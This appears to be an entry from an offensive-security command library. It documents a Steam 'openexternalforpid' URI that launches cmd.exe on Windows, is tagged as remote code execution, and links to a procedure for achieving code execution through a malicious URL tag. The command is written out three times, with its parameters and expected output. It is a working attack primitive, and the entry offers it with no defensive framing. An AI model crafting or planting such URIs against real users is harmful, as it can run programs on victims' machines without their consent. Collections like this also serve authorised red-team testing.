---
data: 'steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe'
tags:
  - steam
  - rce
type: command
executor: bash
platforms:
  - Windows
id: e0361962-5b40-4009-a224-f644ea834916
created_at: '2025-12-11T06:10:17.632Z'
updated_at: '2025-12-11T06:10:17.632Z'
verified: false
validated: true
submitted: true
---
# steam-openexternalforpid-file

## Command

```bash
steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe
```

## Description

Launches an executable like cmd.exe using openexternalforpid URI.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `10400` | PID | Yes |
| `file:///C:/Windows/cmd.exe` | File path | Yes |

## Examples

### Basic Usage

```bash
steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe
```

## Expected Output

Opens cmd.exe on the machine.

## Related

- [[procedures/Achieve-RCE-via-Malicious-URL-Tag]]
